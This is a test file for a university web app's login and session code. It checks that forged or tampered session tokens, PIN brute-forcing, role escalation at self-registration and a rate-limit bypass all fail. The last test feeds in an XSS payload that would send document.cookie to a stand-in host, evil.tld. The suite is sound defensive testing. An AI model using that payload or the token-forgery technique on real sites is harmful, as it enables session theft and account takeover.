import { describe, it, expect, vi } from "vitest";

vi.mock("next/headers", () => ({
  cookies: vi.fn(async () => ({
    get: vi.fn(() => undefined),
    set: vi.fn(),
    delete: vi.fn(),
  })),
}));

vi.mock("next/cache", () => ({
  revalidatePath: vi.fn(),
}));

import {
  signSessionToken,
  verifySessionToken,
  checkPinRateLimit,
  recordFailedPinAttempt,
  clearPinAttempts,
} from "@/lib/auth/token-signer";
import type { UniversitySessionPayload } from "@/lib/auth/university-id";
import {
  registerUniversityAccount,
  signInWithUniversityCredentials,
} from "@/actions/auth.actions";
import { escapeHtml } from "@/lib/utils";

describe("Red-Team Security Penetration Suite", () => {
  const validStudentPayload: UniversitySessionPayload = {
    userId: "cm0userstudent00000000001",
    identifier: "B23F0184CS042",
    email: "b23f0184cs042@students.university.edu",
    fullName: "Areeba Noor (B23F0184CS042)",
    role: "STUDENT",
    departmentId: "cm0deptbscs00000000000001",
    departmentCode: "BSCS",
  };

  it("Exploit 1 Defense: rejects forged unsigned JSON cookies and tampered HMAC payloads escalating STUDENT -> ADMIN", () => {
    const rawForgedJson = JSON.stringify({
      ...validStudentPayload,
      role: "ADMIN",
    });
    expect(verifySessionToken(rawForgedJson)).toBeNull();

    const legitimateToken = signSessionToken(validStudentPayload);
    expect(verifySessionToken(legitimateToken)?.role).toBe("STUDENT");

    const [, originalSignature] = legitimateToken.split(".");
    const tamperedPayloadEncoded = Buffer.from(
      JSON.stringify({ ...validStudentPayload, role: "ADMIN" }),
      "utf-8"
    ).toString("base64url");
    const tamperedToken = `${tamperedPayloadEncoded}.${originalSignature}`;

    expect(verifySessionToken(tamperedToken)).toBeNull();

    const forgedSigToken = `${tamperedPayloadEncoded}.forged_hmac_signature_12345`;
    expect(verifySessionToken(forgedSigToken)).toBeNull();
  });

  it("Exploit 2 Defense: locks account after 5 failed 4-digit PIN brute-force attempts", () => {
    const targetId = "B23F0184CS042_BRUTE_TEST";
    clearPinAttempts(targetId);

    for (let i = 1; i <= 4; i++) {
      const attempt = recordFailedPinAttempt(targetId);
      expect(attempt.locked).toBe(false);
      expect(attempt.remainingAttempts).toBe(5 - i);
      expect(checkPinRateLimit(targetId).allowed).toBe(true);
    }

    const fifthAttempt = recordFailedPinAttempt(targetId);
    expect(fifthAttempt.locked).toBe(true);
    expect(fifthAttempt.remainingAttempts).toBe(0);
    expect(checkPinRateLimit(targetId).allowed).toBe(false);

    clearPinAttempts(targetId);
  });

  it("Exploit 3 Defense: blocks self-registration privilege escalation to COORDINATOR or ADMIN", async () => {
    const attemptCoordinator = await registerUniversityAccount({
      accountType: "FACULTY",
      fullName: "Attacker Faculty",
      identifier: "attacker.faculty@university.edu",
      pin: "9999",
      facultyRole: "COORDINATOR",
    });

    expect(attemptCoordinator.ok).toBe(false);
    if (!attemptCoordinator.ok) {
      expect(attemptCoordinator.error.code).toBe("VALIDATION_ERROR");
    }

    const attemptAdmin = await registerUniversityAccount({
      accountType: "FACULTY",
      fullName: "Attacker Admin",
      identifier: "attacker.admin@university.edu",
      pin: "9999",
      facultyRole: "ADMIN",
    });

    expect(attemptAdmin.ok).toBe(false);
    if (!attemptAdmin.ok) {
      expect(attemptAdmin.error.code).toBe("VALIDATION_ERROR");
    }
  });

  it("Exploit 4 Defense: rejects expired HMAC session tokens and unknown role claims", () => {
    const expiredToken = signSessionToken({
      ...validStudentPayload,
      iat: Date.now() - 10 * 24 * 60 * 60 * 1000,
      exp: Date.now() - 1000,
    });
    expect(verifySessionToken(expiredToken)).toBeNull();

    const unknownRoleToken = signSessionToken({
      ...validStudentPayload,
      role: "SUPERUSER" as UniversitySessionPayload["role"],
    });
    expect(verifySessionToken(unknownRoleToken)).toBeNull();
  });

  it("Exploit 5 Defense: prevents faculty handle-vs-email rate-limit bypass across 5 failed attempts", async () => {
    clearPinAttempts("faculty:kamran.siddiqui");

    // 3 failed attempts via full email
    for (let i = 0; i < 3; i++) {
      const res = await signInWithUniversityCredentials({
        loginMode: "FACULTY",
        identifier: "kamran.siddiqui@university.edu",
        pin: "0000",
      });
      expect(res.ok).toBe(false);
    }

    // 2 failed attempts switching to short handle — must share the same canonical lockout bucket
    await signInWithUniversityCredentials({
      loginMode: "FACULTY",
      identifier: "kamran.siddiqui",
      pin: "0000",
    });
    const fifth = await signInWithUniversityCredentials({
      loginMode: "FACULTY",
      identifier: "kamran.siddiqui",
      pin: "0000",
    });

    expect(fifth.ok).toBe(false);
    if (!fifth.ok) {
      expect(fifth.error.code).toBe("RATE_LIMITED");
    }

    // Even providing the right PIN while locked must be blocked
    const blockedValid = await signInWithUniversityCredentials({
      loginMode: "FACULTY",
      identifier: "kamran.siddiqui@university.edu",
      pin: "2026",
    });
    expect(blockedValid.ok).toBe(false);
    if (!blockedValid.ok) {
      expect(blockedValid.error.code).toBe("RATE_LIMITED");
    }

    clearPinAttempts("faculty:kamran.siddiqui");
  });

  it("Exploit 6 Defense: neutralizes HTML/XSS injection payloads via escapeHtml()", () => {
    const malicious = `<script>fetch("https://evil.tld?c="+document.cookie)</script>`;
    const escaped = escapeHtml(malicious);
    expect(escaped).not.toContain("<script>");
    expect(escaped).toContain("&lt;script&gt;");
  });
});
